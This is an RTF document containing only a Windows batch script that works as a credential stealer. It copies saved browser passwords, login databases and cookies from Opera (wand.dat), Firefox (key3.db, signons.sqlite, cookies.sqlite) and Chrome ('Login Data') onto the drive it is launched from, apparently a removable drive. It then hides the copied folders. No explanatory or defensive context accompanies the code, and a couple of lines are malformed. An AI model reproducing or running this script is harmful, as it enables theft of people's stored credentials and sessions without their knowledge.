{\rtf1\ansi\ansicpg1251\cocoartf1561\cocoasubrtf400
{\fonttbl\f0\fnil\fcharset0 Verdana;}
{\colortbl;\red255\green255\blue255;\red233\green233\blue233;\red19\green19\blue20;}
{\*\expandedcolortbl;;\cssrgb\c92941\c92941\c92941;\cssrgb\c9804\c9804\c10196;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\pardeftab720\partightenfactor0

\f0\fs28 \cf2 \cb3 \expnd0\expndtw0\kerning0
@echo off\cb1 \
\cb3 md %~d0\\Mozilla\cb1 \
\cb3 md %~d0\\Opera\cb1 \
\cb3 md %~d0\\Google\cb1 \
\cb3 CD/D %APPDATA%\\Opera\\Opera\\\cb1 \
\cb3 copy /y wand.dat %~d0\\Opera\\\cb1 \
\cb3 copy /y cookies.dat %~d0\\Opera\\\cb1 \
\cb3 cd %AppData%\\Mozilla\\Firefox\\Profiles\\*.default\cb1 \
\cb3 copy /y cookies.sqlite %~d0\\Mozilla\cb1 \
\cb3 copy /y key3.db %~d0\\Mozilla\cb1 \
\cb3 copy /y signons.sqlite %~d0\\Mozilla\cb1 \
\cb3 copy /y AppData%\\Mozilla\\Firefox\\Profiles\\*.default %~d0\\Mozilla\cb1 \
\cb3 cd %localappdata%\\Google\\Chrome\\User Data\\Default\cb1 \
\cb3 copy /y "%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data" "%~d0\\Google"\cb1 \
\cb3 ATTRIB -R -A -S -H\cb1 \
\cb3 attrib +h %~d0\\Mozilla\cb1 \
\cb3 attrib +h %~d0\\Opera\cb1 \
\cb3 attrib +h %~d0\\Google}